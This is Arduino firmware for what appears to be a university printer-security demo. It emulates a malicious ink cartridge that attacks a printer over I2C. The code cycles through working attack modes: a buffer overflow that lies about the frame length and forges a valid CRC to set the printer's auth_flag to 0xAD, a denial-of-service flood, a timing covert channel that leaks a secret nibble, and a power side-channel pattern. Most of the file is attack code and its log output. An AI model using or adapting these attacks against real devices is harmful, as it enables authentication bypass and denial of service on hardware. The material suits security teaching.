// ============================================================
//  CARTRIDGE FIRMWARE  —  IIT Madras Printer Security Demo
// ============================================================

#include <Wire.h>
#include <string.h>

#define ADDR      0x08
#define SYNC_BYTE 0xFF
#define CHUNK     32

// ── CRC-8 (poly 0x07, init 0x00) ────────────────────────────
uint8_t crc8(const uint8_t *data, uint8_t len) {
    uint8_t crc = 0x00;
    for (uint8_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (uint8_t b = 0; b < 8; b++)
            crc = (crc & 0x80) ? (crc << 1) ^ 0x07 : (crc << 1);
    }
    return crc;
}

// ── Bitmap & payloads ────────────────────────────────────────
const uint8_t BMP[48] = {
    0x3C,0x42,0x81,0x81,0x81,0x81,0x42,0x3C,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x66,0x66,0x00,0x00,0x66,0x66,0x00,
    0x00,0x00,0x18,0x00,0x00,0x18,0x00,0x00,
    0x00,0x42,0x42,0x00,0x00,0x42,0x42,0x00,
    0x00,0x3C,0x42,0x42,0x42,0x42,0x3C,0x00
};

const uint8_t OVF_TAIL[16] = {
    0xAD,                                   // → auth_flag = 0xAD
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
};

const uint8_t JUNK[CHUNK] = {
    0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF,
    0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF,
    0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF,
    0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF
};

// ── TIMING ATTACK payloads ───────────────────────────────────
// The cartridge encodes a secret 4-bit nibble (0xA = 1010b)
// via I2C response delay: chunk delay < 8ms = bit '0',
//                                     >= 8ms = bit '1'.
// Chunk delays (ms): bit3=1→20ms, bit2=0→2ms,
//                    bit1=1→20ms, bit0=0→2ms  → secret=0b1010=0xA
// The printer measures elapsed time per chunk and reconstructs the nibble.
// CRCs are valid — the timing channel is invisible to integrity checks.
#define TIMING_SECRET_NIBBLE   0xA        // 0b1010 — encoded in delays
#define TIMING_THRESHOLD_MS    8          // printer uses this to decode bit

const uint8_t TIMING_DELAYS_MS[4] = {
    20,  // chunk 1: bit3 = 1  (slow)
     2,  // chunk 2: bit2 = 0  (fast)
    20,  // chunk 3: bit1 = 1  (slow)
     2   // chunk 4: bit0 = 0  (fast)
};

// 4 chunks × 12 bytes = 48 bytes total (exactly FRAME_SIZE).
// All chunks carry the same innocuous payload; only timing differs.
const uint8_t TIMING_CHUNK[12] = {
    0x55,0xAA,0x55,0xAA,0x55,0xAA,
    0x55,0xAA,0x55,0xAA,0x55,0xAA
};

// ── POWER ATTACK payloads ────────────────────────────────────
// The cartridge alternates between maximum-hamming-weight (0xFF, HW=8)
// and zero-hamming-weight (0x00, HW=0) chunks to create the largest
// possible swing in bus switching activity.
// On real hardware this produces measurable VCC ripple / current spikes
// that a power trace can distinguish — leaking data/key material.
// CRCs are valid for both chunks; the power channel bypasses them entirely.
const uint8_t POWER_CHUNK_HI[CHUNK] = {   // HW per byte = 8  (all bits 1)
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
};
const uint8_t POWER_CHUNK_LO[CHUNK] = {   // HW per byte = 0  (all bits 0)
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

#define MODE_NORMAL   0
#define MODE_OVERFLOW 1
#define MODE_DOS      2
#define MODE_TIMING   3    // NEW: timing side-channel attack
#define MODE_POWER    4    // NEW: power/EM side-channel attack
#define NUM_MODES     5

const char* MODE_NAMES[NUM_MODES] = {
    "NORMAL", "OVERFLOW", "DoS", "TIMING", "POWER"
};

// ── State ────────────────────────────────────────────────────
volatile uint8_t g_mode = NUM_MODES - 1;

volatile uint8_t g_cidx = 0;
volatile uint8_t g_job  = 0;

// ── Deferred logging ─────────────────────────────────────────
// FIX: Never call Serial.print from on_receive / on_request.
// ISR sets these flags; loop() reads them and prints.
volatile bool    g_log_pending  = false;
volatile uint8_t g_log_job      = 0;
volatile uint8_t g_log_done     = 0;
volatile uint8_t g_log_next     = 0;
volatile bool    g_log_ovf_note = false;

// Timing attack: deferred per-chunk delay request.
// on_request() cannot call delay(); it sets this flag instead.
// loop() services the delay before clearing the flag so the
// NEXT Wire.requestFrom() on the printer side sees the stall.
// (This simulates what a real cartridge MCU would do by stretching
//  the I2C clock — SCL hold — which the Wire ISR cannot do here.)
volatile bool    g_timing_delay_pending = false;
volatile uint8_t g_timing_delay_ms      = 0;

// Precomputed CRCs
uint8_t crc_header_normal;
uint8_t crc_header_overflow;
uint8_t crc_header_dos;
uint8_t crc_bmp_chunk1;
uint8_t crc_bmp_chunk2;
uint8_t crc_ovf_chunk2;
uint8_t crc_junk;

// Timing attack CRCs (one per chunk, all same payload)
uint8_t crc_timing_chunk;         // same payload every chunk

// Power attack CRCs
uint8_t crc_power_hi;
uint8_t crc_power_lo;

// Header CRCs for new modes
uint8_t crc_header_timing;        // page_count=1, frame_len=48
uint8_t crc_header_power;         // page_count=1, frame_len=48 (same)

// ── Mode advance — called from ISR, NO Serial here ───────────
void advance_mode() {
    g_log_job   = g_job + 1;
    g_log_done  = g_mode;

    g_job++;
    g_mode = (g_mode + 1) % NUM_MODES;
    g_cidx = 0;

    g_log_next    = g_mode;
    g_log_pending = true;
}

// ── I2C ISR: receive (SYNC pulse) ────────────────────────────
void on_receive(int n) {
    if (!Wire.available()) return;
    uint8_t b = Wire.read();
    if (b == SYNC_BYTE) advance_mode();
}

// ── I2C ISR: request (printer wants data) ────────────────────
void on_request() {
    switch (g_mode) {

        // ── NORMAL ───────────────────────────────────────────
        case MODE_NORMAL:
            if (g_cidx == 0) {
                uint8_t h[3] = { 2, 48, crc_header_normal };
                Wire.write(h, 3);
                g_cidx = 1;
            } else if (g_cidx == 1) {
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt, BMP, CHUNK);
                pkt[CHUNK] = crc_bmp_chunk1;
                Wire.write(pkt, CHUNK + 1);
                g_cidx = 2;
            } else {
                uint8_t pkt[17];
                memcpy(pkt, BMP + 32, 16);
                pkt[16] = crc_bmp_chunk2;
                Wire.write(pkt, 17);
                g_cidx = 1;   // loop for page 2
            }
            break;

        // ── OVERFLOW ─────────────────────────────────────────
        case MODE_OVERFLOW:
            if (g_cidx == 0) {
                uint8_t h[3] = { 1, 64, crc_header_overflow };
                Wire.write(h, 3);
                g_log_ovf_note = true;
                g_cidx = 1;
            } else if (g_cidx == 1) {
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt, BMP, CHUNK);
                pkt[CHUNK] = crc_bmp_chunk1;
                Wire.write(pkt, CHUNK + 1);
                g_cidx = 2;
            } else {
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt,      BMP + 32, 16);
                memcpy(pkt + 16, OVF_TAIL, 16);
                pkt[CHUNK] = crc_ovf_chunk2;
                Wire.write(pkt, CHUNK + 1);
                g_cidx = 1;
            }
            break;

        // ── DoS ──────────────────────────────────────────────
        case MODE_DOS:
            if (g_cidx == 0) {
                uint8_t h[3] = { 255, 255, crc_header_dos };
                Wire.write(h, 3);
                g_cidx = 1;
            } else {
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt, JUNK, CHUNK);
                pkt[CHUNK] = crc_junk;
                Wire.write(pkt, CHUNK + 1);
            }
            break;

        // ── TIMING SIDE-CHANNEL ───────────────────────────────
        // The cartridge encodes secret bits in chunk response delay.
        // Chunk indices 1-4 carry real data but with deliberate latency.
        // on_request() cannot block here (ISR), so it sets a deferred
        // delay flag; loop() executes the delay before the next request.
        // Think of this as simulating I2C clock-stretching (SCL hold).
        case MODE_TIMING:
            if (g_cidx == 0) {
                // Header: 1 page, 48 bytes (4 × 12 byte chunks).
                uint8_t h[3] = { 1, 48, crc_header_timing };
                Wire.write(h, 3);
                g_cidx = 1;
            } else if (g_cidx >= 1 && g_cidx <= 4) {
                // Chunks 1-4: same innocuous payload, CRC always valid.
                // The secret bit is encoded in the pre-chunk delay.
                uint8_t pkt[13];                  // 12 data + 1 CRC
                memcpy(pkt, TIMING_CHUNK, 12);
                pkt[12] = crc_timing_chunk;
                Wire.write(pkt, 13);

                // Schedule the delay for NEXT chunk (bit index = g_cidx-1).
                // Delay is applied by loop() before the printer's next
                // Wire.requestFrom() fires — this is the covert channel.
                if (g_cidx < 4) {
                    g_timing_delay_ms      = TIMING_DELAYS_MS[g_cidx]; // 0-indexed next bit
                    g_timing_delay_pending = true;
                }
                g_cidx++;
            } else {
                // Should not reach here; send safe padding.
                uint8_t pkt[13] = { 0 };
                pkt[12] = crc8(pkt, 12);
                Wire.write(pkt, 13);
            }
            break;

        // ── POWER / EM SIDE-CHANNEL ───────────────────────────
        // The cartridge alternates maximum-hamming-weight (0xFF, HW=256)
        // and zero-hamming-weight (0x00, HW=0) 32-byte chunks.
        // On real hardware these create maximal / minimal current draw.
        // The printer logs the hamming weight of each received chunk,
        // demonstrating that CRC cannot hide data-dependent power leakage.
        // frame_len=64: two 32-byte chunks → 64 bytes total for 1 page.
        case MODE_POWER:
            if (g_cidx == 0) {
                // frame_len=64 so the printer pulls two CHUNK-sized reads.
                uint8_t h[3] = { 1, 64, crc_header_power };
                Wire.write(h, 3);
                g_cidx = 1;
            } else if (g_cidx == 1) {
                // Chunk 1: all-ones — maximum switching activity / current.
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt, POWER_CHUNK_HI, CHUNK);
                pkt[CHUNK] = crc_power_hi;
                Wire.write(pkt, CHUNK + 1);
                g_cidx = 2;
            } else {
                // Chunk 2: all-zeros — minimum switching activity / current.
                uint8_t pkt[CHUNK + 1];
                memcpy(pkt, POWER_CHUNK_LO, CHUNK);
                pkt[CHUNK] = crc_power_lo;
                Wire.write(pkt, CHUNK + 1);
                g_cidx = 1;   // reset for any further pages
            }
            break;
    }
}

// ── setup ────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);

    // Precompute CRCs (done once here, safe to be slow)
    { uint8_t h[2]={2,48};   crc_header_normal   = crc8(h,2); }
    { uint8_t h[2]={1,64};   crc_header_overflow = crc8(h,2); }
    { uint8_t h[2]={255,255};crc_header_dos       = crc8(h,2); }

    crc_bmp_chunk1 = crc8(BMP, CHUNK);
    crc_bmp_chunk2 = crc8(BMP + 32, 16);

    // FORGED CRC for overflow chunk 2
    {
        uint8_t poisoned[CHUNK];
        memcpy(poisoned,      BMP + 32, 16);
        memcpy(poisoned + 16, OVF_TAIL, 16);
        crc_ovf_chunk2 = crc8(poisoned, CHUNK);
    }

    crc_junk = crc8(JUNK, CHUNK);

    // ── TIMING attack CRCs ───────────────────────────────────
    // All four chunks carry the same payload → same CRC.
    crc_timing_chunk = crc8(TIMING_CHUNK, 12);
    { uint8_t h[2]={1,48};  crc_header_timing = crc8(h,2); }

    // ── POWER attack CRCs ────────────────────────────────────
    crc_power_hi   = crc8(POWER_CHUNK_HI, CHUNK);
    crc_power_lo   = crc8(POWER_CHUNK_LO, CHUNK);
    // header reuses frame_len=64 (two CHUNK-sized pulls)
    { uint8_t h[2]={1,64};  crc_header_power  = crc8(h,2); }

    Wire.begin(ADDR);
    Wire.onReceive(on_receive);
    Wire.onRequest(on_request);

    Serial.println(F("=== CARTRIDGE v3.0 | IIT Madras Printer Security ==="));
    Serial.println(F("  Sequence: NORMAL → OVERFLOW → DoS → TIMING → POWER → repeat"));
    Serial.println(F(""));
    Serial.println(F("  OVERFLOW : frame_len=64 (lie). CRC forged for poisoned chunk."));
    Serial.println(F("             auth_flag := 0xAD. CRC check passed. Owned."));
    Serial.println(F(""));
    Serial.println(F("  TIMING   : Encodes secret nibble in chunk response delays."));
    Serial.println(F("             Slow chunk (>=8ms) = bit 1. Fast (<8ms) = bit 0."));
    Serial.println(F("             All CRCs valid — timing channel is invisible to CRC."));
    Serial.println(F(""));
    Serial.println(F("  POWER    : Alternates HW=256 (0xFF) and HW=0 (0x00) chunks."));
    Serial.println(F("             Maximal vs minimal bus switching activity."));
    Serial.println(F("             CRC passes both. Power trace distinguishes them."));
    Serial.println(F("==================================================="));

    Serial.print(F("  Forged CRC (overflow chunk2): 0x")); Serial.println(crc_ovf_chunk2, HEX);
    Serial.print(F("  Timing chunk CRC (all same) : 0x")); Serial.println(crc_timing_chunk, HEX);
    Serial.print(F("  Power HI chunk CRC          : 0x")); Serial.println(crc_power_hi, HEX);
    Serial.print(F("  Power LO chunk CRC          : 0x")); Serial.println(crc_power_lo, HEX);
    Serial.println();
}

void loop() {
    // ── Deferred delay for timing attack ─────────────────────
    // This must execute BEFORE the printer's next Wire.requestFrom()
    // fires so that the stall is observable as round-trip latency.
    if (g_timing_delay_pending) {
        g_timing_delay_pending = false;
        delay(g_timing_delay_ms);
    }

    // ── Deferred logging ─────────────────────────────────────
    if (g_log_pending) {
        g_log_pending = false;
        Serial.print(F("[CART] Job #"));   Serial.print(g_log_job);
        Serial.print(F(" | mode was "));   Serial.print(MODE_NAMES[g_log_done]);
        Serial.print(F(" → next job: ")); Serial.println(MODE_NAMES[g_log_next]);
    }

    if (g_log_ovf_note) {
        g_log_ovf_note = false;
        Serial.println(F("[CART] OVERFLOW: header sent frame_len=64 (lie)."));
        Serial.print  (F("[CART]   chunk2 CRC=0x")); Serial.print(crc_ovf_chunk2, HEX);
        Serial.println(F(" — forged over 32B poisoned payload."));
        Serial.println(F("[CART]   Printer will verify it → PASS → auth_flag := 0xAD."));
    }
}
